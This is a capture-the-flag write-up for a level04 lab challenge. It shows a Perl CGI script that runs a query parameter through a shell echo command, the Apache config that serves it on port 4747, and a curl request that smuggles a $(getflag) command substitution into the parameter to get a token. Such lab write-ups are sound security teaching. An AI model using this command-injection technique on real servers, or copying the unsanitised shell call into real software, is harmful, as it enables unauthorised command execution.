We have a file named **level04.pl** who contain:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

It's a CGI script who take a query string argument named x and run echo with this value.
This script is already in **/var/www/** which is the root of apache (port 80).
Its owner is **flag04**.

```
$ ls -la /var/www/level04
-r-xr-x---+ 1 flag04 level04 152 Jan 30 10:36 level04.pl
```

We can try to run the CGI:

```
$ curl localhost/level04/level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The CGI is not executed, this server is not configured to run CGI.
Check the config files of apache and we can find where cgi are handle:

```
$ cat sites-available/level05.conf
<VirtualHost *:4747>
        DocumentRoot    /var/www/level04/
        SuexecUserGroup flag04 level04
        <Directory /var/www/level04>
                Options +ExecCGI
                DirectoryIndex level04.pl
                AllowOverride None
                Order allow,deny
                Allow from all
                AddHandler cgi-script .pl
        </Directory>
</VirtualHost>
```

We can try to use the port 4747.

```
$ curl localhost:4747

```

We got a newline so we can deduce that the CGI is executed.
Lets try with a query string who set x.

```
$ curl localhost:4747/?x=hello
hello
```

Its working like expected so we can try to inject some code.

```
$ curl localhost:4747/?x=\$\(getflag\)
Check flag.Here is your token : xxxxxxxxxxxxxxxxxxxxxxxxx
```
